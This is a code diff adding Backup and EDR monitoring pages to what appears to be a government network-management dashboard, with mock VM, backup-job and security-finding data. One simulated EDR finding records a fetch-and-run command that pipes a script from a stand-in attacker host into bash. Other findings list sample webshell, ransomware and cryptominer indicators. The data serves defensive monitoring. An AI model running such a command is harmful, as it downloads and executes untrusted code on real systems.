@@ -94,6 +94,21 @@
         .topo-node { transition: filter .2s, transform .2s; cursor: pointer; }
         .topo-node:hover { filter: drop-shadow(0 4px 8px rgba(79,70,229,.35)); transform-origin: center; }
         .topo-link { transition: stroke-width .2s; }
+        /* Backup page */
+        .bk-row { transition: background .15s; cursor: pointer; }
+        .bk-row:hover { background: #f8faff !important; }
+        .bk-filter-btn { font-size: 9px; font-weight: 800; padding: 4px 10px; border-radius: 8px; transition: all .2s; cursor: pointer; border: none; background: transparent; color: #64748b; }
+        .bk-filter-btn.active { background: white; color: #4f46e5; box-shadow: 0 1px 3px rgba(0,0,0,.1); }
+        /* EDR page */
+        .edr-row { transition: background .15s; cursor: pointer; }
+        .edr-row:hover { background: #f8faff !important; }
+        .edr-finding-row { transition: background .15s; cursor: pointer; }
+        .edr-finding-row:hover { background: #fff5f5 !important; }
+        .edr-filter-btn { font-size: 9px; font-weight: 800; padding: 4px 10px; border-radius: 8px; transition: all .2s; cursor: pointer; border: none; background: transparent; color: #64748b; }
+        .edr-filter-btn.active { background: white; color: #4f46e5; box-shadow: 0 1px 3px rgba(0,0,0,.1); }
+        .edr-pg-tab { font-size: 10px; font-weight: 800; padding: 10px 18px; border-bottom: 3px solid transparent; color: #64748b; transition: all .15s; cursor: pointer; border: none; border-bottom: 3px solid transparent; background: transparent; }
+        .edr-pg-tab.active { border-bottom-color: #dc2626; color: #dc2626; }
+        .edr-pg-tab:hover:not(.active) { color: #475569; background: #f8fafc; }
     </style>
 </head>
 <body class="flex h-screen">
@@ -1703,6 +1718,215 @@
             </div>
         </div>
 
+        <!-- ===== BACKUP MONITORING PAGE ===== -->
+        <div id="nms-backup-page" style="display:none" class="flex-1 flex flex-col overflow-hidden bg-slate-50/60">
+            <!-- Top bar -->
+            <div class="shrink-0 bg-white border-b border-slate-100 px-6 py-3 flex items-center gap-3">
+                <div class="w-9 h-9 bg-violet-50 rounded-2xl flex items-center justify-center shrink-0">
+                    <i class="fas fa-database text-violet-500 text-sm"></i>
+                </div>
+                <div class="flex-1">
+                    <h2 class="text-sm font-extrabold text-slate-800">NMS · Backup</h2>
+                    <p class="text-[9px] text-slate-400 font-medium">Monitoring & manajemen konfigurasi backup VM pemerintah Jawa Barat</p>
+                </div>
+                <span id="bk-last-refresh" class="text-[8px] text-slate-400 font-mono hidden"></span>
+                <button onclick="bkRefresh()" class="text-[9px] font-extrabold text-slate-500 bg-slate-100 hover:bg-slate-200 border border-slate-200 px-3 py-2 rounded-xl transition-colors flex items-center gap-1.5">
+                    <i class="fas fa-sync-alt text-[8px]" id="bk-refresh-icon"></i>Refresh
+                </button>
+                <button onclick="bkShowAddModal()" class="flex items-center gap-1.5 bg-violet-600 hover:bg-violet-700 text-white text-[9px] font-extrabold px-3 py-2 rounded-xl transition-colors shadow-sm shadow-violet-200">
+                    <i class="fas fa-plus text-[8px]"></i>Tambah Job
+                </button>
+            </div>
+            <!-- Summary -->
+            <div class="shrink-0 bg-white border-b border-slate-100 px-6 pb-4 pt-3">
+                <div class="grid grid-cols-4 gap-4" id="bk-summary"></div>
+            </div>
+            <!-- Body -->
+            <div class="flex flex-1 overflow-hidden">
+                <!-- Left: job list -->
+                <div class="flex-1 flex flex-col overflow-hidden border-r border-slate-100">
+                    <!-- Filter bar -->
+                    <div class="shrink-0 bg-white/90 border-b border-slate-100 px-4 py-2.5 flex items-center gap-2">
+                        <div class="flex gap-0.5 bg-slate-100 rounded-xl p-1 shrink-0 flex-wrap">
+                            <button onclick="bkSetFilter('all')"            id="bkf-all"            class="bk-filter-btn active">Semua</button>
+                            <button onclick="bkSetFilter('success')"        id="bkf-success"        class="bk-filter-btn">Berhasil</button>
+                            <button onclick="bkSetFilter('failed')"         id="bkf-failed"         class="bk-filter-btn">Gagal</button>
+                            <button onclick="bkSetFilter('warning')"        id="bkf-warning"        class="bk-filter-btn">Peringatan</button>
+                            <button onclick="bkSetFilter('not_configured')" id="bkf-not_configured" class="bk-filter-btn">Belum Dikonfig</button>
+                            <button onclick="bkSetFilter('veeam')"          id="bkf-veeam"          class="bk-filter-btn">Veeam</button>
+                            <button onclick="bkSetFilter('restic')"         id="bkf-restic"         class="bk-filter-btn">Restic</button>
+                        </div>
+                        <div class="flex-1 relative">
+                            <i class="fas fa-search absolute left-3 top-1/2 -translate-y-1/2 text-slate-400 text-[9px] pointer-events-none"></i>
+                            <input id="bk-search" type="text" placeholder="Cari VM atau SKPD…" oninput="bkRenderList()"
+                                class="w-full pl-8 pr-3 py-1.5 text-[10px] border border-slate-200 rounded-xl bg-white focus:outline-none focus:ring-2 focus:ring-violet-300">
+                        </div>
+                        <span id="bk-count-badge" class="text-[9px] font-extrabold text-slate-500 bg-slate-100 px-2.5 py-1 rounded-lg whitespace-nowrap shrink-0"></span>
+                    </div>
+                    <!-- Table -->
+                    <div class="flex-1 overflow-y-auto">
+                        <table class="w-full">
+                            <thead class="sticky top-0 z-10">
+                                <tr class="bg-slate-50 border-b border-slate-200">
+                                    <th class="px-4 py-2.5 text-left text-[8px] font-extrabold text-slate-400 uppercase tracking-widest w-12">Status</th>
+                                    <th class="px-4 py-2.5 text-left text-[8px] font-extrabold text-slate-400 uppercase tracking-widest">VM / SKPD</th>
+                                    <th class="px-4 py-2.5 text-left text-[8px] font-extrabold text-slate-400 uppercase tracking-widest w-20">Tool</th>
+                                    <th class="px-4 py-2.5 text-left text-[8px] font-extrabold text-slate-400 uppercase tracking-widest">Jadwal</th>
+                                    <th class="px-4 py-2.5 text-left text-[8px] font-extrabold text-slate-400 uppercase tracking-widest">Last Backup</th>
+                                    <th class="px-4 py-2.5 text-left text-[8px] font-extrabold text-slate-400 uppercase tracking-widest w-20">Retensi</th>
+                                    <th class="px-4 py-2.5 text-right text-[8px] font-extrabold text-slate-400 uppercase tracking-widest w-28">Aksi</th>
+                                </tr>
+                            </thead>
+                            <tbody id="bk-job-tbody" class="divide-y divide-slate-50"></tbody>
+                        </table>
+                    </div>
+                </div>
+                <!-- Right: sidebar -->
+                <div class="w-80 shrink-0 bg-white flex flex-col overflow-hidden">
+                    <!-- Repository storage -->
+                    <div class="px-4 py-3 border-b border-slate-100 flex items-center gap-2 shrink-0">
+                        <i class="fas fa-server text-violet-400 text-sm"></i>
+                        <p class="text-xs font-extrabold text-slate-800 flex-1">Repository Storage</p>
+                    </div>
+                    <div class="px-3 py-3 space-y-2.5 shrink-0 border-b border-slate-100" id="bk-repos"></div>
+                    <!-- Alert / failed jobs -->
+                    <div class="px-4 py-3 border-b border-slate-100 flex items-center gap-2 shrink-0">
+                        <i class="fas fa-exclamation-triangle text-rose-400 text-sm"></i>
+                        <p class="text-xs font-extrabold text-slate-800 flex-1">Job Bermasalah</p>
+                        <span id="bk-alert-badge" class="text-[9px] font-extrabold text-white bg-rose-500 px-2 py-0.5 rounded-full hidden"></span>
+                    </div>
+                    <div class="flex-1 overflow-y-auto p-3 space-y-2" id="bk-alert-list"></div>
+                </div>
+            </div>
+        </div><!-- /nms-backup-page -->
+
+        <!-- ===== EDR MONITORING PAGE ===== -->
+        <div id="nms-edr-page" style="display:none" class="flex-1 flex flex-col overflow-hidden bg-slate-50/60">
+            <!-- Top bar -->
+            <div class="shrink-0 bg-white border-b border-slate-100 px-6 py-3 flex items-center gap-3">
+                <div class="w-9 h-9 bg-rose-50 rounded-2xl flex items-center justify-center shrink-0">
+                    <i class="fas fa-shield-virus text-rose-500 text-sm"></i>
+                </div>
+                <div class="flex-1">
+                    <h2 class="text-sm font-extrabold text-slate-800">NMS · EDR Security</h2>
+                    <p class="text-[9px] text-slate-400 font-medium">Monitoring endpoint security & manajemen agen EDR VM pemerintah Jawa Barat</p>
+                </div>
+                <span id="edr-last-refresh" class="text-[8px] text-slate-400 font-mono hidden"></span>
+                <button onclick="edrRefresh()" class="text-[9px] font-extrabold text-slate-500 bg-slate-100 hover:bg-slate-200 border border-slate-200 px-3 py-2 rounded-xl transition-colors flex items-center gap-1.5">
+                    <i class="fas fa-sync-alt text-[8px]" id="edr-refresh-icon"></i>Refresh
+                </button>
+                <button onclick="edrShowInstallModal()" class="flex items-center gap-1.5 bg-rose-600 hover:bg-rose-700 text-white text-[9px] font-extrabold px-3 py-2 rounded-xl transition-colors shadow-sm shadow-rose-200">
+                    <i class="fas fa-plus text-[8px]"></i>Pasang Agen
+                </button>
+            </div>
+            <!-- Summary -->
+            <div class="shrink-0 bg-white border-b border-slate-100 px-6 pb-4 pt-3">
+                <div class="grid grid-cols-4 gap-4" id="edr-summary"></div>
+            </div>
+            <!-- Tabs -->
+            <div class="shrink-0 bg-white border-b border-slate-200 px-4 flex items-center gap-0">
+                <button onclick="edrTabSwitch('agents')" id="edr-tab-agents" class="edr-pg-tab active"><i class="fas fa-server mr-1.5"></i>Daftar Agen</button>
+                <button onclick="edrTabSwitch('findings')" id="edr-tab-findings" class="edr-pg-tab"><i class="fas fa-bug mr-1.5"></i>Temuan Keamanan <span id="edr-finding-badge" class="ml-1 text-[8px] font-extrabold text-white bg-rose-500 px-1.5 py-0.5 rounded-full hidden"></span></button>
+            </div>
+            <!-- Tab 1: Agents -->
+            <div id="edr-tab-agents-content" class="flex-1 flex overflow-hidden">
+                <!-- Left: agent table -->
+                <div class="flex-1 flex flex-col overflow-hidden border-r border-slate-100">
+                    <div class="shrink-0 bg-white/90 border-b border-slate-100 px-4 py-2.5 flex items-center gap-2">
+                        <div class="flex gap-0.5 bg-slate-100 rounded-xl p-1 shrink-0">
+                            <button onclick="edrSetFilter('all')"          id="edrf-all"          class="edr-filter-btn active">Semua</button>
+                            <button onclick="edrSetFilter('licensed')"     id="edrf-licensed"     class="edr-filter-btn">Berlisensi</button>
+                            <button onclick="edrSetFilter('unlicensed')"   id="edrf-unlicensed"   class="edr-filter-btn">Tidak Berlisensi</button>
+                            <button onclick="edrSetFilter('none')"         id="edrf-none"         class="edr-filter-btn">Tanpa Agen</button>
+                            <button onclick="edrSetFilter('threats')"      id="edrf-threats"      class="edr-filter-btn">Ada Temuan</button>
+                        </div>
+                        <div class="flex-1 relative">
+                            <i class="fas fa-search absolute left-3 top-1/2 -translate-y-1/2 text-slate-400 text-[9px] pointer-events-none"></i>
+                            <input id="edr-agent-search" type="text" placeholder="Cari VM atau SKPD…" oninput="edrRenderAgents()"
+                                class="w-full pl-8 pr-3 py-1.5 text-[10px] border border-slate-200 rounded-xl bg-white focus:outline-none focus:ring-2 focus:ring-rose-300">
+                        </div>
+                        <span id="edr-agent-count" class="text-[9px] font-extrabold text-slate-500 bg-slate-100 px-2.5 py-1 rounded-lg whitespace-nowrap shrink-0"></span>
+                    </div>
+                    <div class="flex-1 overflow-y-auto">
+                        <table class="w-full">
+                            <thead class="sticky top-0 z-10">
+                                <tr class="bg-slate-50 border-b border-slate-200">
+                                    <th class="px-4 py-2.5 text-left text-[8px] font-extrabold text-slate-400 uppercase tracking-widest w-14">Status</th>
+                                    <th class="px-4 py-2.5 text-left text-[8px] font-extrabold text-slate-400 uppercase tracking-widest">VM / SKPD</th>
+                                    <th class="px-4 py-2.5 text-left text-[8px] font-extrabold text-slate-400 uppercase tracking-widest">OS</th>
+                                    <th class="px-4 py-2.5 text-left text-[8px] font-extrabold text-slate-400 uppercase tracking-widest w-20">Versi</th>
+                                    <th class="px-4 py-2.5 text-left text-[8px] font-extrabold text-slate-400 uppercase tracking-widest">Policy</th>
+                                    <th class="px-4 py-2.5 text-left text-[8px] font-extrabold text-slate-400 uppercase tracking-widest">Last Scan</th>
+                                    <th class="px-4 py-2.5 text-center text-[8px] font-extrabold text-slate-400 uppercase tracking-widest w-20">Temuan</th>
+                                    <th class="px-4 py-2.5 text-right text-[8px] font-extrabold text-slate-400 uppercase tracking-widest w-20">Aksi</th>
+                                </tr>
+                            </thead>
+                            <tbody id="edr-agent-tbody" class="divide-y divide-slate-50"></tbody>
+                        </table>
+                    </div>
+                </div>
+                <!-- Right: sidebar -->
+                <div class="w-72 shrink-0 bg-white flex flex-col overflow-hidden">
+                    <div class="px-4 py-3 border-b border-slate-100 flex items-center gap-2 shrink-0">
+                        <i class="fas fa-exclamation-triangle text-rose-400 text-sm"></i>
+                        <p class="text-xs font-extrabold text-slate-800 flex-1">Ancaman Aktif</p>
+                        <span id="edr-threat-badge" class="text-[9px] font-extrabold text-white bg-rose-500 px-2 py-0.5 rounded-full hidden"></span>
+                    </div>
+                    <div class="flex-1 overflow-y-auto p-3 space-y-2" id="edr-threat-list"></div>
+                    <div class="px-4 py-3 border-t border-slate-100 flex items-center gap-2 shrink-0">
+                        <i class="fas fa-chart-pie text-slate-400 text-sm"></i>
+                        <p class="text-xs font-extrabold text-slate-800">Distribusi Policy</p>
+                    </div>
+                    <div class="px-3 pb-3 space-y-1.5 shrink-0" id="edr-policy-list"></div>
+                </div>
+            </div>
+            <!-- Tab 2: Findings -->
+            <div id="edr-tab-findings-content" class="flex-1 flex flex-col overflow-hidden" style="display:none">
+                <div class="shrink-0 bg-white/90 border-b border-slate-100 px-4 py-2.5 flex items-center gap-2">
+                    <div class="flex gap-0.5 bg-slate-100 rounded-xl p-1 shrink-0">
+                        <button onclick="edrSetFindingFilter('all')"         id="edrf2-all"         class="edr-filter-btn active">Semua</button>
+                        <button onclick="edrSetFindingFilter('critical')"    id="edrf2-critical"    class="edr-filter-btn">Critical</button>
+                        <button onclick="edrSetFindingFilter('high')"        id="edrf2-high"        class="edr-filter-btn">High</button>
+                        <button onclick="edrSetFindingFilter('medium')"      id="edrf2-medium"      class="edr-filter-btn">Medium</button>
+                        <button onclick="edrSetFindingFilter('no_inc')"      id="edrf2-no_inc"      class="edr-filter-btn">Belum INC</button>
+                        <button onclick="edrSetFindingFilter('open')"        id="edrf2-open"        class="edr-filter-btn">Belum Resolved</button>
+                    </div>
+                    <div class="flex-1 relative">
+                        <i class="fas fa-search absolute left-3 top-1/2 -translate-y-1/2 text-slate-400 text-[9px] pointer-events-none"></i>
+                        <input id="edr-finding-search" type="text" placeholder="Cari tipe, VM, objek…" oninput="edrRenderFindings()"
+                            class="w-full pl-8 pr-3 py-1.5 text-[10px] border border-slate-200 rounded-xl bg-white focus:outline-none focus:ring-2 focus:ring-rose-300">
+                    </div>
+                    <span id="edr-finding-count" class="text-[9px] font-extrabold text-slate-500 bg-slate-100 px-2.5 py-1 rounded-lg whitespace-nowrap shrink-0"></span>
+                </div>
+                <div class="flex-1 overflow-y-auto">
+                    <table class="w-full">
+                        <thead class="sticky top-0 z-10">
+                            <tr class="bg-slate-50 border-b border-slate-200">
+                                <th class="px-4 py-2.5 text-left text-[8px] font-extrabold text-slate-400 uppercase tracking-widest w-20">Severity</th>
+                                <th class="px-4 py-2.5 text-left text-[8px] font-extrabold text-slate-400 uppercase tracking-widest w-32">Tipe Ancaman</th>
+                                <th class="px-4 py-2.5 text-left text-[8px] font-extrabold text-slate-400 uppercase tracking-widest">Objek / Path</th>
+                                <th class="px-4 py-2.5 text-left text-[8px] font-extrabold text-slate-400 uppercase tracking-widest">VM / SKPD</th>
+                                <th class="px-4 py-2.5 text-left text-[8px] font-extrabold text-slate-400 uppercase tracking-widest w-24">Aksi EDR</th>
+                                <th class="px-4 py-2.5 text-left text-[8px] font-extrabold text-slate-400 uppercase tracking-widest w-24">INC</th>
+                                <th class="px-4 py-2.5 text-left text-[8px] font-extrabold text-slate-400 uppercase tracking-widest w-36">Waktu</th>
+                            </tr>
+                        </thead>
+                        <tbody id="edr-finding-tbody" class="divide-y divide-slate-50"></tbody>
+                    </table>
+                </div>
+            </div>
+        </div><!-- /nms-edr-page -->
+
+        <!-- EDR modal overlay -->
+        <div id="edr-modal-ov" class="fixed inset-0 bg-slate-900/50 backdrop-blur-sm z-[80] hidden flex items-center justify-center p-4">
+            <div id="edr-modal-box" class="bg-white rounded-2xl shadow-2xl w-full max-w-2xl max-h-[90vh] overflow-y-auto transform scale-95 transition-transform duration-200"></div>
+        </div>
+
+        <!-- Backup modal overlay -->
+        <div id="bk-modal-ov" class="fixed inset-0 bg-slate-900/50 backdrop-blur-sm z-[80] hidden flex items-center justify-center p-4">
+            <div id="bk-modal-box" class="bg-white rounded-2xl shadow-2xl w-full max-w-2xl max-h-[90vh] overflow-y-auto transform scale-95 transition-transform duration-200"></div>
+        </div>
+
     </main>
 
     <div id="project-overlay" onclick="closeProjectDrawer()" class="fixed inset-0 bg-slate-900/40 backdrop-blur-sm z-40 hidden opacity-0 transition-opacity duration-300"></div>
@@ -2406,17 +2630,54 @@
                 { id:502, vm:'vm-dinkes-simrs-db-01',   skpd:'Dinas Kesehatan',  os:'CentOS 7.9',       edr_status:'licensed',   version:'7.5.1', policy:'Database Tier',     last_sync:'26 Mar 2026, 12:00', last_scan:'26 Mar 2026, 11:50', threats:0, quarantined:0, malicious_log:[] },
                 { id:503, vm:'vm-dinkes-sik-01',        skpd:'Dinas Kesehatan',  os:'Ubuntu 20.04 LTS', edr_status:'unlicensed', version:'7.3.0', policy:'-',                 last_sync:'18 Mar 2026, 09:10', last_scan:'18 Mar 2026, 09:00', threats:2, quarantined:1,
                   malicious_log:[
-                    { tgl:'18 Mar 2026, 08:52', tipe:'Trojan Dropper',    objek:'/tmp/.sysupdate/loader.sh',           aksi:'Quarantined', inc_no:'INC-195', inc_ket:'Script dropper ditemukan di direktori /tmp, kemungkinan eksploitasi melalui celah upload file' },
-                    { tgl:'10 Mar 2026, 14:17', tipe:'Suspicious Script', objek:'/var/www/html/admin/install.php',     aksi:'Blocked',     inc_no:null },
+                    { id:'f503-1', tgl:'18 Mar 2026, 08:52', tipe:'Trojan Dropper',    severity:'Critical', objek:'/tmp/.sysupdate/loader.sh',
+                      hash:'a3f2c1d8e9b47f20c5d3a912b8e4f1c6', ioc:['hash:a3f2c1d8e9b47f20','ip:185.220.101.47','process:.sysupdate','port:4444/tcp'],
+                      deskripsi:'Script dropper ditemukan di direktori /tmp. Malware ini dirancang untuk mengunduh dan mengeksekusi payload tambahan dari server C2 eksternal. Pola eksekusi menyerupai teknik T1059.004.',
+                      rekomendasi:'1) Isolasi VM dari jaringan segera\n2) Analisis seluruh proses yang berjalan\n3) Periksa log akses web untuk titik masuk awal\n4) Reset semua credential yang tersimpan di VM ini',
+                      aksi:'Quarantined', inc_no:'INC-195', inc_ket:'Script dropper ditemukan di direktori /tmp', resolved:false },
+                    { id:'f503-2', tgl:'10 Mar 2026, 14:17', tipe:'Suspicious Script', severity:'High',     objek:'/var/www/html/admin/install.php',
+                      hash:'b7d4e2a1f9c83056d7e2a4b1c9f5d803', ioc:['hash:b7d4e2a1f9c83056','url:/admin/install.php','method:POST'],
+                      deskripsi:'File PHP dengan pola mencurigakan ditemukan di direktori admin. Kemungkinan backdoor yang ditanamkan penyerang untuk akses persisten ke sistem.',
+                      rekomendasi:'1) Hapus file /admin/install.php\n2) Audit log akses ke direktori admin\n3) Perbarui semua credential administrator\n4) Pasang monitoring integritas file (FIM)',
+                      aksi:'Blocked', inc_no:null, resolved:false },
                   ]},
                 { id:504, vm:'vm-bappeda-sipd-01',      skpd:'Bappeda',          os:'Ubuntu 22.04 LTS', edr_status:'licensed',   version:'7.5.1', policy:'Web Tier',          last_sync:'26 Mar 2026, 12:00', last_scan:'26 Mar 2026, 11:55', threats:0, quarantined:0, malicious_log:[] },
                 { id:505, vm:'vm-bappeda-sipd-02',      skpd:'Bappeda',          os:'Ubuntu 22.04 LTS', edr_status:'licensed',   version:'7.5.1', policy:'Web Tier',          last_sync:'26 Mar 2026, 12:00', last_scan:'26 Mar 2026, 12:00', threats:0, quarantined:0, malicious_log:[] },
                 { id:506, vm:'vm-diskominfo-portal-01', skpd:'Diskominfo',       os:'Debian 12',        edr_status:'licensed',   version:'7.5.1', policy:'Production Server', last_sync:'26 Mar 2026, 12:00', last_scan:'26 Mar 2026, 11:30', threats:1, quarantined:1,
                   malicious_log:[
-                    { tgl:'26 Mar 2026, 03:44', tipe:'Webshell',           objek:'/var/www/html/wp-content/uploads/shell.php', aksi:'Quarantined', inc_no:'INC-209', inc_ket:'Webshell PHP ditemukan di direktori upload WordPress, kemungkinan eksploitasi plugin vulnerability' },
+                    { id:'f506-1', tgl:'26 Mar 2026, 03:44', tipe:'Webshell',           severity:'Critical', objek:'/var/www/html/wp-content/uploads/shell.php',
+                      hash:'c9e8b3d4f1a72e6b8c3d9e1f2a4b7c8d', ioc:['hash:c9e8b3d4f1a72e6b','url:/wp-content/uploads/shell.php','ip:192.0.2.55','ua:python-requests/2.28'],
+                      deskripsi:'Webshell PHP ditemukan di direktori upload WordPress. Penyerang dapat mengendalikan server secara remote melalui file ini. Kemungkinan masuk melalui eksploitasi plugin yang rentan.',
+                      rekomendasi:'1) Hapus file webshell segera\n2) Perbarui semua plugin WordPress ke versi terbaru\n3) Audit log upload file untuk menemukan titik masuk\n4) Rotasi password database dan admin WP',
+                      aksi:'Quarantined', inc_no:'INC-209', inc_ket:'Webshell PHP ditemukan di direktori upload WordPress', resolved:false },
                   ]},
                 { id:507, vm:'vm-bpbd-sirens-01',       skpd:'BPBD',             os:'Ubuntu 20.04 LTS', edr_status:'none',       version:'-',     policy:'-',                 last_sync:'-',                  last_scan:'-',                  threats:0, quarantined:0, malicious_log:[] },
                 { id:508, vm:'vm-dprd-sistem-01',       skpd:'Sekretariat DPRD', os:'CentOS 7.9',       edr_status:'none',       version:'-',     policy:'-',                 last_sync:'-',                  last_scan:'-',                  threats:0, quarantined:0, malicious_log:[] },
+                { id:509, vm:'vm-diskominfo-mail-01',   skpd:'Diskominfo',       os:'Debian 12',        edr_status:'licensed',   version:'7.5.1', policy:'Mail Server',       last_sync:'26 Mar 2026, 12:00', last_scan:'26 Mar 2026, 10:00', threats:1, quarantined:0,
+                  malicious_log:[
+                    { id:'f509-1', tgl:'25 Mar 2026, 22:14', tipe:'Ransomware Behavior', severity:'Critical', objek:'/var/mail/vhosts/jabarprov.go.id',
+                      hash:'d8f1c4a7b2e9d6f3a1b8c5e7d2f9a4b6', ioc:['hash:d8f1c4a7b2e9d6f3','process:rsync --delete','port:4444/tcp','technique:T1486'],
+                      deskripsi:'Aktivitas menyerupai pola ransomware terdeteksi — proses melakukan modifikasi masif pada file di direktori mail. Pola enkripsi dan penghapusan file menunjukkan tahap eksekusi ransomware aktif.',
+                      rekomendasi:'1) ISOLASI VM SEGERA dari seluruh jaringan\n2) Hentikan layanan mail sementara\n3) Preservasi forensik disk sebelum tindakan lebih lanjut\n4) Eskalasi ke insiden P1 — hubungi SOC dan manajemen',
+                      aksi:'Detected', inc_no:null, resolved:false },
+                  ]},
+                { id:510, vm:'vm-bpkad-sippkd-01',     skpd:'BPKAD',           os:'Ubuntu 22.04 LTS', edr_status:'licensed',   version:'7.5.1', policy:'Financial Tier',    last_sync:'26 Mar 2026, 12:00', last_scan:'26 Mar 2026, 11:30', threats:1, quarantined:1,
+                  malicious_log:[
+                    { id:'f510-1', tgl:'24 Mar 2026, 16:30', tipe:'Coinminer',           severity:'Medium',   objek:'/usr/local/bin/.hidden/xmrig',
+                      hash:'e1a4b7c2f9d6e3a8b1c4f7d2e9a6b3c1', ioc:['hash:e1a4b7c2f9d6e3a8','process:xmrig','ip:pool.monero.hashvault.pro','port:3333/tcp'],
+                      deskripsi:'Cryptominer XMRig ditemukan berjalan sebagai proses tersembunyi dengan nama menyerupai proses sistem. Mengonsumsi hingga 90% CPU untuk penambangan Monero (XMR).',
+                      rekomendasi:'1) Terminasi proses xmrig\n2) Hapus binary dari /usr/local/bin/.hidden/\n3) Audit cron jobs dan startup scripts\n4) Reset semua SSH keys dan credentials',
+                      aksi:'Quarantined', inc_no:'INC-207', inc_ket:'Cryptominer XMRig terdeteksi pada VM keuangan BPKAD', resolved:true },
+                  ]},
+                { id:511, vm:'vm-dishub-simit-01',      skpd:'Dishub',           os:'Ubuntu 20.04 LTS', edr_status:'licensed',   version:'7.4.2', policy:'Web Tier',          last_sync:'25 Mar 2026, 15:20', last_scan:'25 Mar 2026, 15:00', threats:1, quarantined:0,
+                  malicious_log:[
+                    { id:'f511-1', tgl:'25 Mar 2026, 14:58', tipe:'Lateral Movement',    severity:'High',     objek:'/bin/bash -c "curl -s http://attacker.xyz/payload | bash"',
+                      hash:'f2b5c8d1e4a7f0b3c6d9e2a5f8b1c4d7', ioc:['hash:f2b5c8d1e4a7f0b3','domain:attacker.xyz','ip:203.0.113.99','technique:T1059.004'],
+                      deskripsi:'Perintah shell mencurigakan terdeteksi — upaya lateral movement dengan mengunduh dan mengeksekusi script dari server eksternal. Teknik MITRE ATT&CK T1059.004 (Unix Shell).',
+                      rekomendasi:'1) Blokir akses ke domain attacker.xyz di firewall\n2) Analisis koneksi jaringan VM secara menyeluruh\n3) Periksa akun dan privilege yang digunakan\n4) Terapkan segmentasi jaringan yang lebih ketat',
+                      aksi:'Blocked', inc_no:null, resolved:false },
+                  ]},
+                { id:512, vm:'vm-dinsos-siksda-01',     skpd:'Dinas Sosial',     os:'CentOS 7.9',       edr_status:'unlicensed', version:'7.2.1', policy:'-',                 last_sync:'20 Mar 2026, 08:00', last_scan:'20 Mar 2026, 07:45', threats:0, quarantined:0, malicious_log:[] },
             ],
             backup: [
                 { id:601, vm:'vm-dinkes-simrs-01',      skpd:'Dinas Kesehatan',  tool:'veeam',  schedule:'Daily 01:00', last_backup:'26 Mar 2026, 01:05', retention:'30 hari', bk_status:'Success',
@@ -2463,6 +2724,42 @@
                     { tgl:'25 Mar 2026, 04:10', tipe:'Incremental', status:'Success', size:'750 MB' },
                     { tgl:'24 Mar 2026, 04:15', tipe:'Incremental', status:'Success', size:'690 MB' },
                     { tgl:'12 Mar 2026, 04:00', tipe:'Full',        status:'Success', size:'28 GB' },
+                ]},
+                { id:609, vm:'vm-dispusda-simaster-01', skpd:'Dispusda',          tool:'veeam',  schedule:'Daily 03:30', last_backup:'26 Mar 2026, 03:35', retention:'30 hari', bk_status:'Success',
+                  history:[
+                    { tgl:'26 Mar 2026, 03:35', tipe:'Incremental', status:'Success', size:'1.1 GB' },
+                    { tgl:'25 Mar 2026, 03:32', tipe:'Incremental', status:'Success', size:'980 MB' },
+                    { tgl:'24 Mar 2026, 03:40', tipe:'Incremental', status:'Success', size:'1.2 GB' },
+                    { tgl:'17 Mar 2026, 03:30', tipe:'Full',        status:'Success', size:'42 GB' },
+                ]},
+                { id:610, vm:'vm-bpkad-sippkd-01',     skpd:'BPKAD',             tool:'veeam',  schedule:'Daily 02:30', last_backup:'26 Mar 2026, 02:38', retention:'30 hari', bk_status:'Success',
+                  history:[
+                    { tgl:'26 Mar 2026, 02:38', tipe:'Incremental', status:'Success', size:'2.4 GB' },
+                    { tgl:'25 Mar 2026, 02:35', tipe:'Incremental', status:'Success', size:'2.1 GB' },
+                    { tgl:'24 Mar 2026, 02:40', tipe:'Incremental', status:'Success', size:'2.6 GB' },
+                    { tgl:'15 Mar 2026, 02:30', tipe:'Full',        status:'Success', size:'189 GB' },
+                ]},
+                { id:611, vm:'vm-dishub-simit-01',      skpd:'Dishub',            tool:'restic', schedule:'Daily 05:00', last_backup:'26 Mar 2026, 05:08', retention:'14 hari', bk_status:'Success',
+                  history:[
+                    { tgl:'26 Mar 2026, 05:08', tipe:'Incremental', status:'Success', size:'420 MB' },
+                    { tgl:'25 Mar 2026, 05:05', tipe:'Incremental', status:'Success', size:'380 MB' },
+                    { tgl:'24 Mar 2026, 05:10', tipe:'Incremental', status:'Success', size:'450 MB' },
+                    { tgl:'13 Mar 2026, 05:00', tipe:'Full',        status:'Success', size:'22 GB' },
+                ]},
+                { id:612, vm:'vm-disdik-siplajaran-01', skpd:'Dinas Pendidikan',  tool:'none',   schedule:'-',          last_backup:'-',                  retention:'-',       bk_status:'Not Configured', history:[] },
+                { id:613, vm:'vm-dinsos-siksda-01',     skpd:'Dinas Sosial',      tool:'veeam',  schedule:'Weekly Min 01:00', last_backup:'22 Mar 2026, 01:15', retention:'7 hari', bk_status:'Warning',
+                  history:[
+                    { tgl:'22 Mar 2026, 01:15', tipe:'Full',  status:'Success', size:'28 GB' },
+                    { tgl:'15 Mar 2026, 01:10', tipe:'Full',  status:'Success', size:'26 GB' },
+                    { tgl:'08 Mar 2026, 01:00', tipe:'Full',  status:'Failed',  size:'-',   inc_no:'INC-189', inc_ket:'Waktu eksekusi melebihi window backup yang diizinkan (timeout 4 jam)' },
+                ]},
+                { id:614, vm:'vm-bpkad-aset-01',        skpd:'BPKAD',             tool:'none',   schedule:'-',          last_backup:'-',                  retention:'-',       bk_status:'Not Configured', history:[] },
+                { id:615, vm:'vm-bpbd-siaga-db-01',     skpd:'BPBD',              tool:'restic', schedule:'Daily 06:00', last_backup:'24 Mar 2026, 06:20', retention:'14 hari', bk_status:'Failed',
+                  history:[
+                    { tgl:'26 Mar 2026, 06:00', tipe:'Incremental', status:'Failed',  size:'-',   inc_no:'INC-218', inc_ket:'Repository restic tidak dapat dijangkau — koneksi VPN tunnel terputus' },
+                    { tgl:'25 Mar 2026, 06:00', tipe:'Incremental', status:'Failed',  size:'-',   inc_no:'INC-218', inc_ket:'Repository restic tidak dapat dijangkau — koneksi VPN tunnel terputus' },
+                    { tgl:'24 Mar 2026, 06:20', tipe:'Incremental', status:'Success', size:'290 MB' },
+                    { tgl:'17 Mar 2026, 06:00', tipe:'Full',        status:'Success', size:'18 GB' },
                 ]},
             ],
             skpd: [
@@ -2762,7 +3059,7 @@
             document.querySelectorAll('.submenu-item').forEach(i => i.classList.remove('active'));
 
             // Hide all custom pages first
-            const customPages = ['kebijakan-page','wbs-page','formulir-page','formulir-cat-page','formulir-editor-page','nms-jipd-page'];
+            const customPages = ['kebijakan-page','wbs-page','formulir-page','formulir-cat-page','formulir-editor-page','nms-jipd-page','nms-backup-page','nms-edr-page'];
